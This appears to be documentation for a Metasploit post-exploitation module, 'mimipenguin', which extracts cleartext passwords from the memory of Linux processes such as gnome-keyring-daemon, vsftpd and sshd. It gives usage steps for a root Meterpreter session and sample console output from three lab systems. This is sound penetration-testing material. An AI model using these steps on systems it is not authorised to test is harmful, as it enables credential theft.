## Vulnerable Application

This finds cleartext passwords in process memory by first locating
needles that are known to be found nearby. 

This currently searches for passwords in `gnome-keyring-daemon`, `gdm-password`,
`vsftpd`, `ssh`, and `lightdm`.

## Verification Steps

1. Get a meterpreter session on a Linux-based target (with root privileges)
2. Do: `use post/linux/gather/mimipenguin`
3. Do: `set session <sess_no>`
4. Do: `run`
5. You should get credentials for the vulnerable services installed

## Options

## Scenarios

### Ubuntu 21.04 x64

```
msf6 exploit(multi/handler) > use post/linux/gather/mimipenguin
msf6 post(linux/gather/mimipenguin) > set session 2
session => 2
msf6 post(linux/gather/mimipenguin) > run

[!] SESSION may not be compatible with this module:
[!]  * missing Meterpreter features: stdapi_railgun_api
[*] Checking for matches in process gnome-keyring-daemon
[*] Checking for matches in process gdm-password
[*] Checking for matches in process vsftpd
[*] Checking for matches in process sshd
[*] Checking for matches in process lightdm
[+] Found valid password 'password' for user 'space' in process 'gnome-keyring-daemon'!
[+] Found valid password 'AccountF0rFTP' for user 'jdoe' in process 'vsftpd'!
[+] Found 2 valid credential(s)!
[*] Post module execution completed
msf6 post(linux/gather/mimipenguin) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > sysinfo
Computer     : 192.168.140.131
OS           : Ubuntu 21.04 (Linux 5.11.0-49-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 192.168.140.131 - Meterpreter session 2 closed.  Reason: User exit
msf6 post(linux/gather/mimipenguin) > creds
Credentials
===========

host  origin  service  public  private        realm  private_type  JtR Format
----  ------  -------  ------  -------        -----  ------------  ----------
                       space   password              Password      
                       jdoe    AccountF0rFTP         Password  
```

### Fedora 27 x64

```
msf6 post(linux/gather/mimipenguin) > run

[!] SESSION may not be compatible with this module:
[!]  * missing Meterpreter features: stdapi_railgun_api
[*] Checking for matches in process gnome-keyring-daemon
[*] Checking for matches in process gdm-password
[*] Checking for matches in process vsftpd
[*] Checking for matches in process sshd
[*] Checking for matches in process lightdm
[+] Found valid password 'M!mipenguinPass' for user 'mimipenguin' in process 'gnome-keyring-daemon'!
[+] Found valid password 'FTPP@ssword' for user 'ftp_user' in process 'vsftpd'!
[+] Found 2 valid credential(s)!
[*] Post module execution completed
msf6 post(linux/gather/mimipenguin) > creds
Credentials
===========

host  origin  service  public       private          realm  private_type  JtR Format
----  ------  -------  ------       -------          -----  ------------  ----------
                       mimipenguin  M!mipenguinPass         Password
                       ftp_user     FTPP@ssword             Password


```

### Ubuntu 14.04.1 x86

```
msf6 post(linux/gather/mimipenguin) > run

[!] SESSION may not be compatible with this module:
[!]  * missing Meterpreter features: stdapi_railgun_api
[*] Checking for matches in process gnome-keyring-daemon
[*] Checking for matches in process gdm-password
[*] Checking for matches in process vsftpd
[*] Checking for matches in process sshd
[*] Checking for matches in process lightdm
[+] Found valid password 'password' for user 'space' in process 'gnome-keyring-daemon'!
[+] Found valid password 'RunningUpThatH!ll' for user 'test' in process 'gnome-keyring-daemon'!
[+] Found 2 valid credential(s)!
[*] Post module execution completed
msf6 post(linux/gather/mimipenguin) > creds
Credentials
===========

host  origin  service  public  private            realm  private_type  JtR Format
----  ------  -------  ------  -------            -----  ------------  ----------
                       space   password                  Password
                       test    RunningUpThatH!ll         Password
```
